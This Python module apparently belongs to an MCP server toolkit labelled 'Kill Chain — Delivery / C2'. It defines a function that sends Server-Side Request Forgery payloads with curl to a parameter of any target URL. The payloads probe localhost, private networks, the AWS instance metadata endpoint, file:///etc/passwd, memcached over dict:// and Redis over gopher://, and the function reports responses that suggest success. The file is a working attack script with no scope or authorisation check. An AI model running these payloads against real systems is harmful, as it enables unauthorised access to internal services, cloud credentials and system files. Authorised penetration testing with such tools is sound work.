"""Kill Chain — Delivery / C2: test a URL parameter for Server-Side Request Forgery."""
from __future__ import annotations

import subprocess
from typing import Any

from mcp_servers.tools._common import SUBPROCESS_ENV, safe_filename, save_to_workspace, sanitize_input

_SSRF_PAYLOADS = [
    ("internal_localhost",   "http://localhost/"),
    ("internal_127",         "http://127.0.0.1/"),
    ("internal_169_aws",     "http://169.254.169.254/latest/meta-data/"),
    ("internal_192_168",     "http://192.168.1.1/"),
    ("internal_10_x",        "http://10.0.0.1/"),
    ("file_etc_passwd",      "file:///etc/passwd"),
    ("dict_protocol",        "dict://127.0.0.1:11211/stats"),
    ("gopher_redis",         "gopher://127.0.0.1:6379/_PING%0D%0A"),
]


def ssrf_test(url: str, param: str, method: str = "GET") -> dict[str, Any]:
    """
    Test a URL parameter for SSRF by injecting internal/file/gopher payloads
    and checking whether the server fetches them (response length change, error messages).

    Args:
        url: Target URL (e.g. http://target/fetch?url=)
        param: Query parameter or POST field that takes a URL value
        method: HTTP method, GET or POST
    """
    url = sanitize_input(url)
    param = sanitize_input(param)
    method = sanitize_input(method).upper() or "GET"
    if not url or not param:
        return {"status": "error", "error": "url and param are required"}

    results = []
    for label, payload in _SSRF_PAYLOADS:
        if method == "POST":
            cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}",
                   "-X", "POST", "-d", f"{param}={payload}", url]
        else:
            separator = "&" if "?" in url else "?"
            full_url = f"{url}{separator}{param}={payload}"
            cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}",
                   full_url]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10, env=SUBPROCESS_ENV)
            code, size = (r.stdout.strip() + ":0").split(":")[:2]
            results.append({"payload_label": label, "payload": payload, "http_code": code, "response_size": int(size)})
        except Exception as e:
            results.append({"payload_label": label, "payload": payload, "error": str(e)})

    suspicious = [r for r in results if r.get("http_code") == "200" and r.get("response_size", 0) > 0]
    summary = f"{len(suspicious)}/{len(results)} payloads got non-empty 200 responses — potential SSRF" if suspicious else "No SSRF indicators found"
    out = "\n".join(f"{r['payload_label']}: {r.get('http_code','ERR')} size={r.get('response_size',0)}" for r in results)
    log_path = save_to_workspace(safe_filename(url, "ssrf_test"), out)

    return {
        "status": "success",
        "tool": "ssrf_test",
        "target": url,
        "param": param,
        "summary": summary,
        "results": results,
        "suspicious_payloads": suspicious,
        "full_output_file": log_path,
    }
